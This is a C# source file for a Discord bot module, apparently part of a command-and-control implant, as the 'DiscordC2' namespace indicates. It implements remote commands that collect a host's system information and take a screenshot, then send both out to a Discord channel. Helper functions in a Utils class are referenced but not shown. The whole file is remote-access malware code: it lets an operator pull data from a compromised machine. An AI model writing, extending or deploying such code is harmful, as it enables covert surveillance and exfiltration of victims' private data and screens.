using Discord;
using Discord.Commands;
using RunMode = Discord.Commands.RunMode;

namespace DiscordC2.Modules;

public class DiscordC2Commands : ModuleBase<ShardedCommandContext>
{
    public CommandService CommandService { get; set; }

    // [Command("hello", RunMode = RunMode.Async)]
    // public async Task Hello()
    // {
    //     await Context.Message.ReplyAsync($"Hello {Context.User.Username}. Nice to meet you!");
    // }

    [Command("systeminfo", RunMode = RunMode.Async)]
    public async Task SystemInfo()
    {
        string systemInfo = Utils.GetSystemInfo();

        IEnumerable<string> chunks = Utils.CommandOutputWrapper(systemInfo);
        foreach (string chunk in chunks)
        {
            await Context.Message.ReplyAsync(chunk);
        }
    }


    [Command("screenshot", RunMode = RunMode.Async)]
    public async Task Screenshot()
    {
        await Context.Message.Channel.SendFileAsync(Utils.GetScreenshot(), "screenshot.png");
    }
}

